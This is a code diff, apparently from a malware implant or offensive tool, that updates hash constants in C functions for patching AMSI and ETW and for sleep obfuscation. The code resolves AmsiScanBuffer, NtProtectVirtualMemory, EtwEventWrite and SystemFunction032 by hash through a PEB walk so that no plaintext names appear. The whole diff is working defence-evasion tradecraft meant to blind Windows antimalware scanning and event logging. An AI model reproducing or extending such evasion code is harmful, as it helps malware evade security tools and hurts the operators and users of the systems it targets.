@@ -60,7 +60,7 @@ BOOL evasion_patch_amsi(void) {
     if (!hAmsi) return TRUE;  /* AMSI not loaded — nothing to patch */
 
     /* Resolve AmsiScanBuffer by hash from the loaded amsi module */
-    #define HASH_AmsiScanBuffer 0xDC5B6220
+    #define HASH_AmsiScanBuffer 0x29FCD18E
     void *pFunc = api_resolve_from_module(hAmsi, HASH_AmsiScanBuffer);
     if (!pFunc) return FALSE;
 
@@ -70,7 +70,7 @@ BOOL evasion_patch_amsi(void) {
     void *pBase = pFunc;
 
     /* Use NtProtectVirtualMemory via PEB-resolved hash */
-    #define HASH_NtProtectVirtualMemory_RT 0x50E92888
+    #define HASH_NtProtectVirtualMemory_RT 0x082962C8
     pNtProtectVirtualMemory NtPVM = (pNtProtectVirtualMemory)
         api_resolve(HASH_NTDLL, HASH_NtProtectVirtualMemory_RT);
 
@@ -108,7 +108,7 @@ BOOL evasion_patch_etw(void) {
      *
      * Resolved via PEB walk — no plaintext "ntdll.dll" or "EtwEventWrite".
      */
-    #define HASH_EtwEventWrite 0xB10B5E68
+    #define HASH_EtwEventWrite 0x24A8D022
     void *pFunc = api_resolve(HASH_NTDLL, HASH_EtwEventWrite);
     if (!pFunc) return FALSE;
 
@@ -265,7 +265,7 @@ static void _get_module_bounds(void **base, DWORD *size) {
 void evasion_sleep_obfuscated(DWORD milliseconds) {
 #if CONFIG_SLEEP_OBFUSCATE
     /* Resolve SystemFunction032 (RC4) from advapi32 via PEB walk */
-    #define HASH_SystemFunction032 0xE58C8805
+    #define HASH_SystemFunction032 0xCCCF3585
     pSystemFunction032 SystemFunction032 =
         (pSystemFunction032)api_resolve(HASH_ADVAPI32, HASH_SystemFunction032);
     if (!SystemFunction032) {
